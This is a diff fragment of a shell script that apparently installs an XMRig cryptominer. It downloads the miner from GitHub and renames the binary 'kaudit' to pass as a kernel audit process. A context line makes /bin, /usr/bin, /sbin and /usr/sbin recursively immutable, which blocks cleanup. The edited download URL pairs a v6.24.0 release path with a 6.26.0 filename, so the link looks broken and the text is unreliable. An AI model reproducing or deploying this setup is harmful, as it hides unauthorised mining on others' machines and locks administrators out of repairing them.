@@ -45,7 +45,7 @@ sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
 echo "[*] Starting XMRig Setup Script"
 
 # Constants
-XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
+XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 XMRIG_ARCHIVE="/tmp/xmrig.tar.gz"
 XMRIG_DIR="/opt/xmrig"
 XMRIG_BINARY="$XMRIG_DIR/kaudit"
